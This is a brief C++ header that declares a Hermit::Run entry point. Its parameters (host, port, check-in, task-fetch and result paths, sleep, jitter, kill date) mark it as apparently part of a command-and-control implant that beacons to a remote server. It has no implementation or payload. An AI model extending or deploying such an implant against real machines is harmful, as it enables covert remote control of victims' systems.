#ifndef HERMIT_HPP
#define HERMIT_HPP

#include "core/handler.hpp"
#include "core/system.hpp"

namespace Hermit
{
	BOOL Run(
		HINSTANCE       hInstance,
		INT             nCmdShow,
		LPCWSTR 		lpHost,
		INTERNET_PORT 	nPort,
		LPCWSTR 		lpRequestCheckInPath,
		LPCWSTR 		lpRequestTaskGetPath,
		LPCWSTR 		lpRequestTaskResultPath,
		INT 			nSleep,
		INT				nJitter,
		INT				nKillDate
	);
}


#endif // HERMIT_HPP